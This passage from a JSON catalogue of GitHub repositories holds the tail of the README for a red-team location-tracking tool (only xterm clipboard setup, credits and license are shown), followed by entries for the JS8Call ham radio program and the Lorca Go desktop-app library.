location:\\n\\n![image](https://user-images.githubusercontent.com/3501170/55271991-4e4da300-530a-11e9-91ec-2fb83ef46461.png)\\n\\n# Copying Longitude and Latitude numbers from Xterm screens\\n\\nTo copy between xterm and other programs - This would allow user to select numbers to be copied to the clipboard.\\n1. Add to the file ~/.Xresources (or create)\\n\\n2.\\n<pre>\\nXTerm*selectToClipboard: true\\n</pre>\\n3. Then run the command:\\n<pre>\\nxrdb -merge ~/.Xresources\\n</pre>\\n4. Restart xterm.\\n\\n# Questions?\\n\\nTwitter: https://twitter.com/maniarviral <br>\\nLinkedIn: https://au.linkedin.com/in/viralmaniar\\n\\n# Contribution & License\\n\\n<a rel=\\\"license\\\" href=\\\"http://creativecommons.org/licenses/by/4.0/\\\"><img alt=\\\"Creative Commons License\\\" style=\\\"border-width:0\\\" src=\\\"https://i.creativecommons.org/l/by/4.0/80x15.png\\\" /></a><br />This work is licensed under a <a rel=\\\"license\\\" href=\\\"http://creativecommons.org/licenses/by/4.0/\\\">Creative Commons Attribution 4.0 International License</a>.</br>\\nWant to contribute? Please fork it and hit up with a pull request.\\n\\nAny suggestions or ideas for this tool are welcome - just tweet me on [@ManiarViral](https://twitter.com/maniarviral)\\n\\n# Thanks\\n\\nSpecial thanks to cryptomarauder aka voidengineer\\n\"", "topics": ["bash-scripting", "geolocation", "geotargeting", "location-tracker", "location-tracking", "osint", "osint-reconnaissance", "osinttool", "phishing", "phishing-attacks", "phishing-engagements", "phishing-kit", "reconnaissance", "redteam", "redteaming", "socialengineering"], "writeup": "", "ignoredescription": false, "id": 49, "full_name": "Viralmaniar/I-See-You", "url": "https://github.com/Viralmaniar/I-See-You"},
{"tags": [], "owner": "widefido", "description": "", "name": "widefido/js8call", "topics_string": "sdr radio ham js8", "language": "C++", "readme": "", "topics": ["sdr", "radio", "ham", "js8"], "writeup": "S8Call is an experiment in combining the robustness of FT8 (a weak-signal mode by K1JT) with a messaging and network protocol layer for weak signal communication. The open source software is designed for connecting amateur radio operators who are operating under weak signal conditions and offers real-time keyboard-to-keyboard messaging, store-and-forward messaging, and automatic station announcements. Read more on the original design inspiration here: https://github.com/jsherer/js8call For release announcements and discussion, join the JS8Call mailing list here: https://groups.io/g/js8call Documentation is available here: https://docs.google.com/document/d/159S4wqMUVdMA7qBgaSWmU-iDI4C9wd4CuWnetN68O9U/edit?pli=1#heading=h.kfnyge37yfr\n", "ignoredescription": false, "id": 50, "full_name": "widefido/js8call", "url": "https://github.com/widefido/js8call"},
{"tags": ["golang", "gui", "electron"], "owner": "zserge", "description": "Build cross-platform modern desktop apps in Go + HTML5", "name": "lorca", "topics_string": "golang gui electron", "language": "Go", "readme": "\"# Lorca\\n\\n[![Build Status](https://img.shields.io/github/workflow/status/zserge/lorca/CI%20Pipeline)](https://github.com/zserge/lorca)\\n[![GoDoc](https://godoc.org/github.com/zserge/lorca?status.svg)](https://godoc.org/github.com/zserge/lorca)\\n[![Go Report Card](https://goreportcard.com/badge/github.com/zserge/lorca)](https://goreportcard.com/report/github.com/zserge/lorca)\\n\\n<div>\\n<img align=\\\"left\\\" src=\\\"https://raw.githubusercontent.com/zserge/lorca/master/lorca.png\\\" alt=\\\"Lorca\\\" width=\\\"128px\\\" height=\\\"128px\\\" />\\n<br/>\\n<p>\\n\\tA very small library to build modern HTML5 desktop apps in Go. It uses Chrome\\n\\tbrowser as a UI layer. Unlike Electron it doesn't bundle Chrome into the app\\n\\tpackage, but rather reuses the one that is already installed. Lorca\\n\\testablishes a connection to the browser window and allows calling Go code\\n\\tfrom the UI and manipulating UI from Go in a seamless manner.\\n</p>\\n<br/>\\n</div>\\n\\n\\n## Features\\n\\n* Pure Go library (no cgo) with a very simple API\\n* Small application size (normally 5-10MB)\\n* Best of both worlds - the whole power of HTML/CSS to make your UI look\\n\\tgood, combined with Go performance and ease of development\\n* Expose Go functions/methods and call them from JavaScript\\n* Call arbitrary JavaScript code from Go\\n* Asynchronous flow between UI and main app in both languages (async/await and Goroutines)\\n* Supports loading web UI from the local web server or via data URL\\n* Supports embedding all assets into a single binary\\n* Supports testing your app with the UI in the headless mode\\n* Supports multiple app windows\\n* Supports packaging and branding (e.g. custom app icons). Packaging for all\\n\\tthree OS can be done on a single machine using GOOS and GOARCH variables.\\n\\nAlso, limitations by design:\\n\\n* Requires Chrome/Chromium >= 70 to be installed.\\n* No control over the Chrome window yet (e.g. you can't remove border, make it\\n\\ttransparent, control position or size).\\n* No window menu (tray menus and native OS dialogs are still possible via\\n\\t3rd-party libraries)\\n\\nIf you want to have more control of the browser window - consider using\\n[webview](https://github.com/zserge/webview) library with a similar API, so\\nmigration would be smooth.\\n\\n## Example\\n\\n```go\\nui, _ := lorca.New(\\\"\\\", \\\"\\\", 480, 320)\\ndefer ui.Close()\\n\\n// Bind Go function to be available in JS. Go function may be long-running and\\n// blocking - in JS it's represented with a Promise.\\nui.Bind(\\\"add\\\", func(a, b int) int { return a + b })\\n\\n// Call JS function from Go. Functions may be asynchronous, i.e. return promises\\nn := ui.Eval(`Math.random()`).Float()\\nfmt.Println(n)\\n\\n// Call JS that calls Go and so on and so on...\\nm := ui.Eval(`add(2, 3)`).Int()\\nfmt.Println(m)\\n\\n// Wait for the browser window to be closed\\n<-ui.Done()\\n```\\n\\n<p align=\\\"center\\\"><img src=\\\"examples/counter/counter.gif\\\" /></p>\\n\\nAlso, see [examples](examples) for more details about binding functions, embedding\\nassets and packaging binaries.\\n\\n## Hello World\\n\\nHere are the steps to run the hello world example.\\n\\n```\\ncd examples/counter\\ngo get\\ngo run main.go\\n```\\n\\n## How it works\\n\\nUnder the hood Lorca uses [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/) to instrument on a Chrome instance. First Lorca tries to locate your installed Chrome, starts a remote debugging instance binding to an ephemeral port and reads from `stderr` for the actual WebSocket endpoint. Then Lorca opens a new client connection to the WebSocket server, and instruments Chrome by sending JSON messages of Chrome DevTools Protocol methods via WebSocket. JavaScript functions are evaluated in Chrome, while Go functions actually run in Go runtime and returned values are sent to Chrome.\\n\\n## What's in a name?\\n\\n> There is kind of a legend, that before his execution Garcia Lorca have seen a\\n> sunrise over the heads of the soldiers and he said \\\"And yet, the sun rises...\\\".\\n> Probably it was the beginning of a poem. (J. Brodsky)\\n\\nLorca is an anagram of [Carlo](https://github.com/GoogleChromeLabs/carlo/), a\\nproject with a similar goal for Node.js.\\n\\n## License\\n\\nCode is distributed under MIT license, feel free to use it in your proprietary\\nprojects as well.\\n\\n\"", "topics": [], "writeup": "Build cross-platform modern desktop apps in Go + HTML5  A very small library to build modern HTML5 desktop apps in Go. It uses Chrome browser as a UI layer. Unlike Electron it doesn't bundle Chrome into the app package, but rather reuses the one that is already installed. Lorca establishes a connection to the browser window and allows calling Go code from the UI and manipulating UI from Go in a seamless manner. \n", "ignoredescription": false, "id": 51, "full_name": "zserge/lorca", "url": "https://github.com/zserge/lorca"},
]
